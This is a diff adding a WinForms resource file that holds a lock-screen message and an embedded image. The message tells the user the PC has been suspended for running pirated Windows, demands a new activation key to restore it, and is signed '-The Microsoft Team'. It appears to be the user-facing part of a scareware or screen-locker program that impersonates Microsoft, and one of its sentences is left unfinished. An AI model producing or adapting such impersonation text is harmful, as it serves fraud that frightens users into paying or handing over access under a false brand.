@@ -1,0 +1,38 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="Label2.Text"><value>Your PC appears to be running an ill-gained copy of Windows. As a result, PC functionality has been suspended. You will be able to restore your PC to its former state after unlocking with a new activation key.
+
+You can find your new activation key by clicking
+
+After you enter a valid key, your PC will be restored to its working state and you will not see this message again.
+
+-The Microsoft Team
+</value></data>
+  <data name="PictureBox1.Image" mimetype="application/x-microsoft.net.object.binary.base64"><value>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</value></data></root>
